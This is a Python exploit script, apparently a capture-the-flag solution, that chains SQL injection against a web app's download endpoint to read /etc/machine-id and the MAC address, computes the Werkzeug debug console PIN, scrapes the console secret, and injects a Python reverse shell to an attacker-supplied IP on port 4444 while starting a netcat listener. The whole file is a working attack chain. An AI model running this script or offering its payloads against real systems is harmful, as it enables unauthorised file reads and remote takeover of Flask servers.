#!/usr/bin/python3

import hashlib
from itertools import chain

# this function was mostly copied from https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug
def werkz(mac,m_id):
    probably_public_bits = [
        'mcskidy',# username
        'flask.app',# modname
        'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
        '/home/mcskidy/.local/lib/python3.8/site-packages/flask/app.py' # getattr(mod, '__file__', None),
    ]
    private_bits = [
        mac,# str(uuid.getnode()),  /sys/class/net/eth0/address
        'aee6189caee449718070b58132f2e4ba'# get_machine_id(), /etc/machine-id
    ]

    #h = hashlib.md5() # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')
    #h.update(b'shittysalt')

    cookie_name = '__wzd' + h.hexdigest()[:20]

    num = None
    if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]

    rv =None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                              for x in range(0, len(num), group_size))
                break
        else:
            rv = num

    return rv

#----------------------------------------------------------------------------

import os,sys,requests

try:
    RHOST = sys.argv[1]
    LHOST = sys.argv[2]
except:
    print(f"Syntax: {__file__} [VICTIM_IP] [ATTACKER_IP]")
    exit()

LPORT = 4444

# get machine id via SQLi (actually not further used in this script, since the machine id is always the same)
r = requests.get(f"http://{RHOST}:8000/download?id=' UNION ALL SELECT 'file:////////////////etc/machine-id' as ggge-- ----")
m_id = r.content.decode('utf-8').strip()
print('machine id',m_id)

# get machine MAC address via SQLi
r = requests.get(f"http://{RHOST}:8000/download?id=' UNION ALL SELECT 'file:////////////////sys/class/net/eth0/address' as ggge-- ----")
mac = str(int(''.join(r.content.decode('utf-8').split(':')),16))
print('MAC',mac)

# calculate PIN for werkzeug debug console
pin = werkz(mac,m_id)
print('PIN:',pin)

#--------------------------------------------------------

answer = input('activate shell now? [y/N]: ')
if answer != 'y' and answer != 'Y':
    exit()

#--------------------------------------------------------

# get SECRET variable
r = requests.get(f"http://{RHOST}:8000/console")
SECRET = r.text.split('SECRET = "')[1].split('"')[0]

def activate_shell():
    # python reverse shell code
    payload = f'import os,pty,socket;s=socket.socket();s.connect(("{LHOST}",{LPORT}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'

    s = requests.Session()

    # authenticate using PIN
    s.get(f"http://{RHOST}:8000/console?__debugger__=yes&cmd=pinauth&pin={pin}&s={SECRET}")

    # start reverse shell
    s.get(f"http://{RHOST}:8000/console?&__debugger__=yes&cmd={payload}&frm=0&s={SECRET}")


from threading import Timer
t = Timer(1,activate_shell) # activate reverse shell after one second
t.start()

os.system(f"nc -lnvp {LPORT}") # netcat listener must start before reverse shell is activated

